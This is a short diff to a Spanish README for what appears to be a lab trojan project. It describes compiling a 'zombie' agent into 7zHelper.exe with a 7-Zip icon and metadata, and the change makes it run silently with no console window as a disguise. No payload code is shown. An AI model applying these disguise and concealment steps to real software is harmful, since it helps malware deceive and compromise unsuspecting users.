@@ -124,9 +124,10 @@ python -m PyInstaller pyinstaller/AgenteUTN.spec --noconfirm
 ```
 
 Genera `troyano/dist/7zHelper.exe` con **icono tipo 7-Zip y metadatos de un
-componente de 7-Zip**. El spec deja `console=True` para ver la salida del
-zombie en el laboratorio; con `console=False` la ventana desaparece por
-completo (disfraz total, la salida se pierde).
+componente de 7-Zip**. El `.exe` se compila **sin ventana** (`console=False`):
+corre en silencio y no deja ninguna consola pegada en pantalla (los mensajes
+se descartan con el shim de `src/main.py`). Para ver la salida durante
+pruebas, cambiar a `console=True` en el spec.
 
 ## Generar el instalador disfrazado
 
